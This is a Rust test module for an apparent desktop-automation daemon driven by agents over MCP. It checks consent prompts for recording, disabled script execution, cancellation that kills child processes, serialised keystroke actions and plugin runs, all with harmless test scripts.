    #[tokio::test]
    async fn record_start_asks_under_confirm_and_a_no_starts_nothing() {
        let asked = Arc::new(Mutex::new(Vec::new()));
        let seen = Arc::clone(&asked);
        let asker: Asker = Arc::new(move |q| {
            seen.lock().unwrap().push(q);
            let (tx, rx) = oneshot::channel();
            let _ = tx.send(false);
            rx
        });
        let d = daemon(
            Echo,
            Guard {
                confirm: Confirm::Coordinate,
                asker: Some(asker),
                ..Guard::default()
            },
        )
        .with_recordings(std::env::temp_dir());
        let out = d.answer(call("record_start", json!({}))).await;
        assert_eq!(out.text, DECLINED);
        assert!(!d.recording());
        assert_eq!(
            *asked.lock().unwrap(),
            ["Allow shuttle to record your input?"]
        );
    }

    #[tokio::test]
    async fn record_start_refuses_apps_that_are_not_a_list_of_names() {
        let d = daemon(Echo, Guard::default()).with_recordings(std::env::temp_dir());
        for apps in [json!("Notes"), json!(["Notes", 5])] {
            let out = d.answer(call("record_start", json!({"apps": apps}))).await;
            assert!(
                out.is_error && out.text.starts_with("invalid arguments"),
                "{}",
                out.text
            );
        }
        assert!(!d.recording());
    }

    #[tokio::test]
    async fn script_run_turned_off_answers_how_to_turn_it_on() {
        let d = daemon(
            Echo,
            Guard {
                script_run: false,
                ..Guard::default()
            },
        );
        let out = d
            .answer(call(
                "script_run",
                json!({"code": "export function main() { return 1 }"}),
            ))
            .await;
        assert_eq!((out.is_error, out.text.as_str()), (true, SCRIPT_RUN_OFF));
    }

    #[tokio::test]
    async fn a_run_dropped_mid_flight_is_no_longer_acting() {
        let d = Arc::new(daemon(Echo, Guard::default()));
        let run = tokio::spawn({
            let d = d.clone();
            async move {
                d.answer(call(
                    "script_run",
                    json!({"code": "export async function main() { await new Promise((r) => setTimeout(r, 30000)) }"}),
                ))
                .await
            }
        });
        assert!(crate::until(40, || d.acting()).await);
        run.abort();
        let _ = run.await;
        assert!(!d.acting());
    }

    #[tokio::test]
    async fn a_run_lets_go_of_its_desk_holds_when_it_ends_or_is_dropped() {
        let released = Releases::default();
        let d = Arc::new(daemon(released.clone(), Guard::default()));
        d.answer(call(
            "script_run",
            json!({"code": "export function main() { return 1 }"}),
        ))
        .await;
        assert_eq!(released.0.lock().unwrap().len(), 1);
        let run = tokio::spawn({
            let d = d.clone();
            async move {
                d.answer(call(
                    "script_run",
                    json!({"code": "export async function main() { await new Promise((r) => setTimeout(r, 30000)) }"}),
                ))
                .await
            }
        });
        crate::until(40, || d.acting()).await;
        run.abort();
        let _ = run.await;
        let holders = released.0.lock().unwrap().clone();
        assert_eq!(holders.len(), 2, "{holders:?}");
        assert!(holders.iter().all(|h| h.starts_with("run-")), "{holders:?}");
        assert_ne!(holders[0], holders[1]);
    }

    #[tokio::test]
    async fn script_run_goes_to_the_runner() {
        let d = daemon(Echo, Guard::default());
        let out = d
            .answer(call(
                "script_run",
                json!({"code": "export function main() { return 42 }"}),
            ))
            .await;
        let report: Value = serde_json::from_str(&out.text).unwrap();
        assert_eq!(report["result"], 42, "{report}");
    }

    #[tokio::test]
    async fn a_run_whose_report_carries_an_error_is_an_error_with_the_whole_report() {
        let d = daemon(Echo, Guard::default());
        let out = d
            .answer(call(
                "script_run",
                json!({"code": "export function main() { console.log('before'); throw new Error('boom') }"}),
            ))
            .await;
        assert!(out.is_error, "{}", out.text);
        let report: Value = serde_json::from_str(&out.text).unwrap();
        assert_eq!(report["error"]["kind"], "exception", "{report}");
        assert!(report["logs"].to_string().contains("before"), "{report}");
    }

    #[cfg(unix)]
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn an_mcp_cancel_ends_the_run_it_names_long_before_the_run_would_end() {
        use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};

        let (_d, _keys, dir) = served(Duration::from_secs(10)).await;
        let endpoint = dir.path().join("d.sock").to_string_lossy().into_owned();
        let pid_file = dir.path().join("child.pid");
        let code = format!(
            "import {{ spawn }} from 'node:child_process'; import {{ writeFileSync }} from 'node:fs'; export async function main() {{ const c = spawn('sleep', ['30']); writeFileSync({:?}, String(c.pid)); await new Promise((r) => setTimeout(r, 30000)) }}",
            pid_file.to_string_lossy()
        );
        let (mut to_mcp, input) = tokio::io::duplex(1 << 16);
        let (output, from_mcp) = tokio::io::duplex(1 << 16);
        let mcp = tokio::spawn({
            let endpoint = endpoint.clone();
            async move {
                crate::mcp::serve(
                    BufReader::new(input),
                    output,
                    &endpoint,
                    &crate::plugins::Plugins::default(),
                )
                .await
            }
        });
        let line = |v: Value| format!("{v}\n").into_bytes();
        to_mcp
            .write_all(&line(json!({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "script_run", "arguments": {"code": code, "timeout_s": 30}}})))
            .await
            .unwrap();
        let child = started_child(&pid_file).await;
        to_mcp
            .write_all(&line(json!({"jsonrpc": "2.0", "method": "notifications/cancelled", "params": {"requestId": 1}})))
            .await
            .unwrap();
        let started = std::time::Instant::now();
        // SAFETY: kill with signal 0 only checks that the process exists.
        while unsafe { libc::kill(child, 0) } == 0 {
            assert!(
                started.elapsed() < Duration::from_secs(3),
                "the cancelled run's child outlived the cancel"
            );
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        to_mcp
            .write_all(&line(json!({"jsonrpc": "2.0", "id": 2, "method": "ping"})))
            .await
            .unwrap();
        drop(to_mcp);
        tokio::time::timeout(Duration::from_secs(5), mcp)
            .await
            .expect("the MCP server outlived its input")
            .unwrap()
            .unwrap();
        let mut replies = BufReader::new(from_mcp).lines();
        let mut ids = Vec::new();
        while let Some(l) = replies.next_line().await.unwrap() {
            ids.push(serde_json::from_str::<Value>(&l).unwrap()["id"].clone());
        }
        assert_eq!(ids, [json!(2)]);
    }

    #[cfg(unix)]
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_closed_connection_kills_its_run_with_its_children_and_frees_the_turn() {
        let (d, _keys, dir) = served(Duration::from_secs(10)).await;
        let endpoint = dir.path().join("d.sock").to_string_lossy().into_owned();
        let pid_file = dir.path().join("child.pid");
        let code = format!(
            "import {{ spawn }} from 'node:child_process'; import {{ writeFileSync }} from 'node:fs'; export async function main() {{ const c = spawn('sleep', ['30']); writeFileSync({:?}, String(c.pid)); await new Promise((r) => setTimeout(r, 30000)) }}",
            pid_file.to_string_lossy()
        );
        let mut conn = shuttle_desk::server::connect(&endpoint).await.unwrap();
        desk_core::wire::write_frame(&mut conn, &script(&code))
            .await
            .unwrap();
        let child = started_child(&pid_file).await;
        drop(conn);
        let started = std::time::Instant::now();
        // SAFETY: kill with signal 0 only checks that the process exists.
        while unsafe { libc::kill(child, 0) } == 0 {
            assert!(
                started.elapsed() < Duration::from_secs(3),
                "the run's child outlived the closed connection"
            );
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
        let next = tokio::time::timeout(
            Duration::from_secs(5),
            d.answer(script("export function main() { return 7 }")),
        )
        .await
        .expect("the turn stayed held after the connection closed");
        let report: Value = serde_json::from_str(&next.text).unwrap();
        assert_eq!(report["result"], 7, "{report}");
        assert!(started.elapsed() < Duration::from_secs(5));
    }

    #[cfg(unix)]
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn two_runs_at_once_never_interleave_their_actions() {
        let (d, keys, _dir) = served(Duration::from_secs(10)).await;
        let code = |a: &str, b: &str| {
            format!(
                "export async function main() {{ await desk.key('{a}'); await new Promise((r) => setTimeout(r, 200)); await desk.key('{b}') }}"
            )
        };
        let (x, y) = tokio::join!(
            d.answer(script(&code("a", "b"))),
            d.answer(script(&code("c", "d")))
        );
        for out in [x, y] {
            let report: Value = serde_json::from_str(&out.text).unwrap();
            assert!(report.get("error").is_none(), "{report}");
        }
        let got = keys.0.lock().unwrap().join("");
        assert!(got == "abcd" || got == "cdab", "{got}");
    }

    #[cfg(unix)]
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_desk_action_during_a_run_gets_busy_after_the_bound() {
        let (d, keys, _dir) = served(Duration::from_millis(100)).await;
        let run = d.answer(script(
            "export async function main() { await desk.key('a'); await new Promise((r) => setTimeout(r, 1000)) }",
        ));
        let outside = async {
            tokio::time::sleep(Duration::from_millis(400)).await;
            d.answer(Call {
                agent_id: "agent".into(),
                tool: "desk_key".into(),
                args: json!({"keys": "x"}),
            })
            .await
        };
        let (ran, out) = tokio::join!(run, outside);
        assert_eq!((out.is_error, out.text.as_str()), (true, BUSY));
        let report: Value = serde_json::from_str(&ran.text).unwrap();
        assert!(report.get("error").is_none(), "{report}");
        assert_eq!(*keys.0.lock().unwrap(), ["a"]);
    }

    #[cfg(target_os = "linux")]
    #[tokio::test]
    async fn with_background_input_gui_plan_refuses_on_linux_and_says_why() {
        let d = daemon(
            Echo,
            Guard {
                background: true,
                ..Guard::default()
            },
        );
        let out = d.answer(call("gui_plan", json!({"steps": []}))).await;
        assert_eq!((out.is_error, out.text.as_str()), (true, PLAN_BACKGROUND));
    }

    #[tokio::test]
    async fn with_script_run_off_a_plugin_answers_how_to_turn_it_on() {
        let d = daemon(
            Echo,
            Guard {
                script_run: false,
                ..Guard::default()
            },
        )
        .with_plugins(vec![demo("/usr/bin/demo".into())]);
        let out = d
            .answer(call(
                "demo_run",
                json!({"code": "export function main() { return 1 }"}),
            ))
            .await;
        assert_eq!((out.is_error, out.text.as_str()), (true, SCRIPT_RUN_OFF));
    }

    #[cfg(unix)]
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn a_plugin_runs_on_its_own_program_and_its_desk_calls_reach_the_desk() {
        let bins = tempfile::tempdir().unwrap();
        let bin = bins.path().join("demo-bin");
        crate::script(
            &bin,
            "#!/bin/sh\necho \"$@\" > \"$0.argv\"\nexec node \"$@\"\n",
        )
        .unwrap();
        let (d, keys, _dir) = served_with(Duration::from_secs(10), vec![demo(bin.clone())]).await;
        let out = d
            .answer(Call {
                agent_id: "agent".into(),
                tool: "demo_run".into(),
                args: json!({"code": "export async function main() { await desk.key('p'); return 'plugin' }"}),
            })
            .await;
        let report: Value = serde_json::from_str(&out.text).unwrap();
        assert_eq!(report["result"], "plugin", "{report}");
        assert_eq!(*keys.0.lock().unwrap(), ["p"]);
        let argv = std::fs::read_to_string(bins.path().join("demo-bin.argv")).unwrap();
        assert!(argv.contains("entry."), "{argv}");
    }

    struct Echo;

    impl Handler for Echo {
        async fn answer(&self, call: Call) -> Output {
            Output::text(format!("desk answered {}", call.tool))
        }
    }

    #[derive(Clone, Default)]
    struct Releases(Arc<Mutex<Vec<String>>>);

    impl Handler for Releases {
        async fn answer(&self, call: Call) -> Output {
            Output::text(format!("desk answered {}", call.tool))
        }

        fn release(&self, holder: &str) {
            self.0.lock().unwrap().push(holder.to_owned());
        }
    }

    #[derive(Clone, Default)]
    struct Allowed(Arc<AtomicUsize>);

    impl Handler for Allowed {
        async fn answer(&self, call: Call) -> Output {
            Output::text(format!("desk answered {}", call.tool))
        }

        fn allowed(&self) {
            self.0.fetch_add(1, Ordering::Relaxed);
        }
    }

    struct Slow;

    impl Handler for Slow {
        async fn answer(&self, _: Call) -> Output {
            tokio::time::sleep(Duration::from_secs(10)).await;
            Output::text("too late")
        }
    }

    struct Typing;

    impl Handler for Typing {
        async fn answer(&self, call: Call) -> Output {
            if call.tool == "desk_type" {
                tokio::time::sleep(Duration::from_millis(300)).await;
            }
            Output::text(format!("desk answered {}", call.tool))
        }
    }

    #[cfg(unix)]
    #[derive(Clone, Default)]
    struct Keys(Arc<Mutex<Vec<String>>>);

    #[cfg(unix)]
    impl Handler for Keys {
        async fn answer(&self, call: Call) -> Output {
            if let Some(k) = call.args["keys"].as_str() {
                self.0.lock().unwrap().push(k.to_owned());
            }
            Output::text("{}")
        }
    }

    impl Default for Guard {
        fn default() -> Self {
            Self {
                script_run: true,
                confirm: Confirm::Off,
                asker: None,
                background: false,
            }
        }
    }

    fn call(tool: &str, args: Value) -> Call {
        Call {
            agent_id: String::new(),
            tool: tool.into(),
            args,
        }
    }

    fn runner() -> Runner {
        runner_at(
            "unused".into(),
            std::env::temp_dir().join("shuttle-test-flows"),
        )
    }

    fn runner_at(endpoint: String, flows: PathBuf) -> Runner {
        let runtime = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../runtime/lib");
        Runner::new("node".into(), runtime, endpoint, flows, Vec::new())
    }

    fn daemon<H: Handler>(desk: H, guard: Guard) -> Daemon<H> {
        Daemon::new(desk, Ok(Models::new(Config::default())), runner(), guard)
    }

    fn held() -> (Asker, Arc<Mutex<Option<oneshot::Sender<bool>>>>) {
        let pending = Arc::new(Mutex::new(None));
        let held = pending.clone();
        let asker: Asker = Arc::new(move |_| {
            let (tx, rx) = oneshot::channel();
            *held.lock().unwrap() = Some(tx);
            rx
        });
        (asker, pending)
    }

    fn demo(bin: PathBuf) -> Plugin {
        Plugin {
            name: "demo_run".into(),
            description: "Run a demo script.".into(),
            bin,
            resources: Vec::new(),
        }
    }

    #[cfg(unix)]
    async fn served(wait: Duration) -> (Arc<Daemon<Keys>>, Keys, tempfile::TempDir) {
        served_with(wait, Vec::new()).await
    }

    #[cfg(unix)]
    async fn served_with(
        wait: Duration,
        plugins: Vec<Plugin>,
    ) -> (Arc<Daemon<Keys>>, Keys, tempfile::TempDir) {
        let dir = tempfile::tempdir().unwrap();
        let endpoint = dir.path().join("d.sock").to_string_lossy().into_owned();
        let keys = Keys::default();
        let mut d = Daemon::new(
            keys.clone(),
            Ok(Models::new(Config::default())),
            runner_at(endpoint.clone(), dir.path().join("flows")),
            Guard::default(),
        )
        .with_plugins(plugins);
        d.wait = wait;
        let d = Arc::new(d);
        tokio::spawn({
            let (d, endpoint) = (Arc::clone(&d), endpoint.clone());
            async move {
                shuttle_desk::server::serve(d, shuttle_desk::server::bind(&endpoint).await?).await
            }
        });
        for _ in 0..50 {
            if shuttle_desk::server::connect(&endpoint).await.is_ok() {
                break;
            }
            tokio::time::sleep(Duration::from_millis(10)).await;
        }
        (d, keys, dir)
    }

    #[cfg(unix)]
    fn script(code: &str) -> Call {
        Call {
            agent_id: "agent".into(),
            tool: "script_run".into(),
            args: json!({"code": code}),
        }
    }

    #[cfg(unix)]
    async fn started_child(pid_file: &Path) -> i32 {
        for _ in 0..200 {
            if let Some(pid) = std::fs::read_to_string(pid_file)
                .ok()
                .and_then(|pid| pid.trim().parse().ok())
            {
                return pid;
            }
            tokio::time::sleep(Duration::from_millis(25)).await;
        }
        panic!("the run started no child");
    }
}
